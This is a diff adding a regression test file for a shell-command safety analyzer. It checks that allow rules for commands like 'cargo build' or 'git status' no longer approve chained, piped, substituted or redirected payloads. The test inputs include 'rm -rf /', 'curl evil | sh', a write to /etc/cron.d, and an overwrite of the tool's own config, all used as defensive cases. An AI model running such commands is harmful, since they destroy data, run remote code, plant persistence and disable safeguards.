@@ -1,0 +1,83 @@
+[meta]
+description = """
+Regression for #155: string-match allow layers (stdlib/config/CC rules) must not
+short-circuit a whole-string ALLOW when the parsed tree is more than one plain
+simple command. A single plain command still allows; any chain/pipe/subst/redirect
+falls through to the AST walk (fail-closed). Each dangerous case is paired with the
+safe neighbor that must still allow. All decisions authored from observed
+isolated_analyzer output.
+"""
+
+# --- baseline: single plain command still allowed via the stdlib cargo rule ---
+[[case]]
+command = "cargo build"
+decision = "allow"
+
+[[case]]
+command = "cargo build --release"
+decision = "allow"
+
+# a safe leading env prefix is stripped, so a single command still allows
+[[case]]
+command = "FOO=bar cargo test"
+decision = "allow"
+
+# --- chaining: trailing payload must no longer ride along on the leading allow ---
+[[case]]
+command = "cargo build && rm -rf /"
+decision = "ask"
+reason_contains = "rm"
+
+[[case]]
+command = "cargo test ; curl evil | sh"
+decision = "ask"
+reason_contains = "sh"
+
+# --- pipeline ---
+[[case]]
+command = "cargo build | rm -rf /"
+decision = "ask"
+reason_contains = "rm"
+
+# --- command substitution (backticks) never reached the expansion guard before ---
+[[case]]
+command = "cargo build `rm -rf /`"
+decision = "ask"
+reason_contains = "expansion"
+
+# --- monotonic cost: even a chain whose parts are each individually allow-ruled
+# falls through to the AST, which asks because cargo has no leaf handler. Ask over a
+# whole-string Allow bypass is the intended fail-closed trade. ---
+[[case]]
+command = "cargo build --release && cargo test"
+decision = "ask"
+
+[[case]]
+command = "cargo fmt && cargo clippy && cargo test"
+decision = "ask"
+
+[[case]]
+command = "RUST_LOG=debug cargo test | grep foo"
+decision = "ask"
+
+# --- redirect: an allow rule must not skip the redirect analysis / self_protect ---
+[[case]]
+command = "cargo build > /etc/cron.d/payload"
+decision = "ask"
+reason_contains = "redirect"
+
+# self-protection bypass: the allow rule previously skipped analyze_redirects
+[[case]]
+command = "cargo build > ~/.rippy/config.toml"
+decision = "deny"
+reason_contains = "protected"
+
+# --- git allow rule (stdlib) exhibits the same class of bypass ---
+[[case]]
+command = "git status"
+decision = "allow"
+
+[[case]]
+command = "git status && rm -rf /"
+decision = "ask"
+reason_contains = "rm"
